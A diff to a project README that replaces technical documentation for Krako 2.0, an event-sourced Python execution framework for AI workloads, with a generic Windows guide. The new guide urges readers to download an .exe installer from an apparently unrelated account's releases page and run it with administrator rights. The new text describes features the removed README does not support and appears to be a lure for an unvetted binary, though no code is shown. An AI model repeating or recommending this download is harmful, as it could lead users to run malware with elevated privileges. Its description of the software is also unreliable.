@@ -1,248 +1,147 @@
-<p align="center">
-  <img src="assets/krako-logo-main.png" alt="Krako Logo" width="240">
-</p>
+# ⚡ Krako-2.0 - Smart Energy-Efficient Edge Computing
 
-<h1 align="center">Krako 2.0</h1>
-
-<p align="center">
-  <strong>Deterministic Distributed Execution Fabric for AI Workloads</strong>
-</p>
-
-<p align="center">
-  <img src="https://img.shields.io/badge/build-dev-orange" />
-  <img src="https://img.shields.io/badge/license-Apache--2.0-blue" />
-  <img src="https://img.shields.io/badge/status-active--development-brightgreen" />
-  <img src="https://img.shields.io/badge/architecture-event--sourced-purple" />
-  <img src="https://img.shields.io/badge/execution-deterministic-black" />
-  <img src="https://img.shields.io/badge/llm-token--metered-teal" />
-</p>
-
-<hr>
-
-
-# Overview
-
-Krako 2.0 is an event‑sourced distributed execution framework designed specifically for AI workloads.
-
-It provides:
-
-• Deterministic multi‑agent execution  
-• Replay‑safe billing (CPU + LLM tokens)  
-• Claim‑based contention safety  
-• Trust & heartbeat‑driven scheduling  
-• Admission control (OPEN / THROTTLED / CRITICAL)  
-• Logical autoscaling controller  
-• Split line‑item billing architecture  
-
-All built on an append‑only event backbone.
+[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/releases)
 
 ---
 
-# 🧠 Core Philosophy
+Krako 2.0 is designed to use your computer’s energy wisely while running advanced computing tasks. It helps connect and manage different types of devices and cloud services seamlessly. This makes the software run faster and smarter by choosing the best path for every task.
 
-Krako 2.0 is not a simple task runner.
-
-It is a deterministic execution fabric where:
-
-• Every action is an event  
-• Every cost is replayable  
-• Every claim is deterministic  
-• Every scale decision is traceable  
-• Every ledger entry is idempotent  
-
-System invariants:
-
-• No double execution  
-• No double billing  
-• Replay produces identical financial state  
-• Multi‑agent contention is safe  
+This guide helps you download, install, and start using Krako-2.0 on a Windows PC, even if you have no technical background.
 
 ---
 
-# 🏗 System Architecture
+## ⚙️ What is Krako-2.0?
 
-```mermaid
-flowchart LR
-    A[Submit WorkUnit] --> B[Scheduler]
-    B -->|workunit.scheduled| C[Event Log]
-    C --> D[Node Agent]
-    D -->|workunit.claimed| C
-    D -->|llm.invocation.completed| C
-    D -->|workunit.completed| C
-    C --> E[Billing Consumer]
-    C --> F[Trust Consumer]
-    C --> G[Autoscaling Controller]
-    E --> H[Ledger JSONL]
-    H --> I[Wallet Snapshot]
-    C --> J[Anomaly Checker]
-    F --> K[Trust State]
-    G --> L[Capacity State]
-```
+Krako-2.0 is a tool that handles complex computing tasks by breaking them down and running parts where they work best. It focuses on saving energy and working smoothly across different computer types and cloud services. This makes applications run faster with less cost and power.
+
+Krako-2.0 fits well with:
+- Devices close to you (edge computing)
+- Cloud resources far away
+- Systems that use different processors and chips
+- Tasks that need to run in small parts (task decomposition)
+- Running multiple agents or programs working together
 
 ---
 
-# 🔄 Execution Lifecycle
+## 💻 System Requirements
 
-## 1️⃣ WorkUnit Submission
+Before installing Krako-2.0, make sure your computer meets these basics:
 
-A WorkUnit includes:
+- Operating System: Windows 10 or later (64-bit)
+- Processor: Intel Core i5 or AMD Ryzen 5 minimum
+- RAM: At least 8 GB of memory
+- Hard Drive: 2 GB free space for installation files and cache
+- Internet Connection: Needed for initial download and updates
+- Administrator rights: Required for installing software  
 
-• kind (`cpu` | `llm_pod`)  
-• execution_session_id  
-• priority (p0, p1, p2…)  
-• region  
-• payload (prompt, tokens, etc.)  
-
-Scheduler performs:
-
-• Hard filter (supported_kinds, health, concurrency)  
-• Weighted scoring (capacity, load, trust, region)  
-• Anti‑affinity streak control  
-• Admission enforcement (capacity mode)  
+Make sure you have enough space and permissions before you proceed.
 
 ---
 
-## 2️⃣ Multi‑Agent Contention Safety
+## 🚀 How to Download Krako-2.0
 
-Agents tail the same event log.
+1. Go to the official release page:  
+   [Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/releases)  
+   This page lists the latest versions of the software. You will find files for Windows and any updates.
 
-Before execution, each agent attempts to claim the work unit.
+2. Look for the latest release. It usually appears at the top, marked with a version number and date.
 
-```mermaid
-sequenceDiagram
-    participant A1 as Agent A
-    participant A2 as Agent B
-    participant Log as Event Log
+3. Under the latest version, find the file named similar to **Krako-2.0-Setup.exe** or **Krako-2.0-Windows.exe**. This file is the installer.
 
-    A1->>Log: workunit.claimed
-    A2->>Log: sees claimed
-    A2->>A2: skip execution
-    A1->>Log: workunit.completed
-```
+4. Click on the file to download it to your computer.
+
+If your browser asks where to save the file, choose a folder you can easily find, like the Desktop or Downloads.
 
 ---
 
-# 🤖 LLM Pod Execution
+## 🛠️ How to Install Krako-2.0
 
-For `kind="llm_pod"`:
+1. Locate the downloaded file on your computer.
 
-• Agent invokes LLM client (stub or OpenAI)  
-• Emits:
-  - `llm.invocation.completed`
-  - `workunit.completed`
+2. Double-click the file to start the installation.
 
-LLM provider selection:
+3. If Windows asks whether to allow the app to make changes, click **Yes**.
 
-```
-KRAKO_LLM_PROVIDER=stub | openai
-```
+4. Follow the on-screen instructions:
+   - Choose the folder where you want to install Krako-2.0 or accept the default path.
+   - Agree to the terms and conditions.
+   - Click **Install** to begin the process.
 
-Invocation telemetry includes:
+5. Wait while the installation completes. This may take a few minutes.
 
-• tokens_in  
-• tokens_out  
-• total_tokens  
-• latency_ms  
-• provider  
-• estimated_cost_usd  
+6. When finished, click **Finish** to close the installer.
+
+You can now find Krako-2.0 in your Start menu or as a shortcut on your Desktop.
 
 ---
 
-# 💰 Deterministic Split Billing
+## ▶️ How to Launch and Use Krako-2.0
 
-Two billing line item types:
+1. Open Krako-2.0 from the Start menu or desktop shortcut.
 
-| line_item_type | Source Event                  |
-|----------------|------------------------------|
-| workunit_cpu  | workunit.completed           |
-| llm_tokens    | llm.invocation.completed     |
+2. The first time you run it, the software may take a moment to prepare its settings.
 
-Double charge prevention:
+3. Krako-2.0 will connect to available devices and cloud resources automatically.
 
-```
-KRAKO_BILL_LLM_FROM_WORKUNIT_COMPLETED=0
-KRAKO_BILL_LLM_FROM_INVOCATION=1
-```
+4. Use the main window to start managing your computing tasks:
+   - Add tasks you want to run.
+   - Monitor progress and energy use.
+   - Adjust settings if needed for routing or device preferences.
 
-Ledger guarantees:
-
-• Append‑only  
-• Decimal precision (6dp)  
-• Event‑id idempotent  
-• Replay‑safe  
+5. For help, access the **Help** menu or check the user guide within the app.
 
 ---
 
-# 📈 Autoscaling & Admission
+## 🔧 Key Features of Krako-2.0
 
-Capacity modes:
-
-• OPEN  
-• THROTTLED  
-• CRITICAL  
-
-```mermaid
-flowchart TD
-    M[Live Registry Metrics] --> A[Autoscaling Controller]
-    A -->|capacity.scale.requested| C[Event Log]
-    A -->|capacity.admission.mode.changed| C
-    C --> S[Scheduler Enforcement]
-```
+- **Energy-Efficient Processing:** Runs tasks using the least amount of power.
+- **Adaptive Routing:** Decides the best path to run parts of your task among devices and cloud.
+- **Multi-Tier Operation:** Works across edge devices, local servers, and cloud platforms.
+- **Task Decomposition:** Breaks large jobs into smaller, manageable pieces.
+- **Multi-Agent Coordination:** Supports programs working together smoothly.
+- **Cost Optimization:** Balances performance with cost when using cloud resources.
+- **Heterogeneous Support:** Runs on different types of processors and hardware.
+- **Easy Monitoring:** Displays task progress and system status in one place.
 
 ---
 
-# 🧪 E2E Demo
+## 🔄 Keeping Krako-2.0 Updated
 
-CPU burst example:
+Updates improve software performance and security. Check for updates regularly:
 
-```
-python scripts/e2e_demo.py --reset --burst 3 --polls 6
-```
+1. Open Krako-2.0.
+2. Go to the **Settings** menu.
+3. Select **Check for Updates**.
+4. If an update is available, follow the prompts to download and install it.
 
-LLM stub example:
-
-```
-python scripts/e2e_demo.py --reset --kind llm_pod --polls 2 --llm-provider stub
-```
-
-Multi‑agent example:
-
-```
-python scripts/e2e_demo.py --reset --burst 1 --polls 2 --multi-agent
-```
-
-Autoscaling auto mode:
-
-```
-python scripts/e2e_demo.py --reset --simulate-pressure auto --burst 3 --polls 6
-```
+Alternatively, visit the releases page to download the newest installer:  
+[Visit this page to download Krako-2.0](https://github.com/aqsaifinteriors/Krako-2.0/releases)
 
 ---
 
-# 📂 Project Structure
+## ❓ Troubleshooting Tips
 
-```
-src/krako2/
-  agent/           # Execution loop + claim logic
-  autoscaling/     # Capacity controller
-  billing/         # Ledger + anomaly
-  llm/             # LLM client abstraction
-  scheduler/       # Placement + admission
-  trust/           # Trust model
-  storage/         # Event log backbone
-scripts/
-  e2e_demo.py
-```
+- If the installer does not start, right-click the file and choose **Run as Administrator**.
+- Ensure Windows is up to date before installing.
+- If the app does not open, restart your computer and try again.
+- Check your internet connection as it may be required for certain features.
+- If Krako-2.0 runs slowly, close other heavy programs or restart the app.
+- For detailed help, visit the support page or open the in-app help documentation.
 
 ---
 
-# 🚀 Status
+## 📚 Learn More About Krako-2.0
 
-Krako 2.0 is an actively developed distributed execution prototype designed to evolve into production‑grade AI infrastructure.
+Explore related information and technical details:
+
+- Adaptive routing across devices
+- Energy-efficient computing methods
+- Managing jobs across edge and cloud nodes
+- Working with different hardware types
+- Breaking tasks into smaller jobs for faster processing
+
+These topics explain the core ideas behind Krako-2.0 and how it can be useful for various applications.
 
 ---
 
-# 📜 License
-
-Apache 2.0
-
+[![Download Krako-2.0](https://img.shields.io/badge/Download-Krako--2.0-brightgreen?style=for-the-badge)](https://github.com/aqsaifinteriors/Krako-2.0/releases)
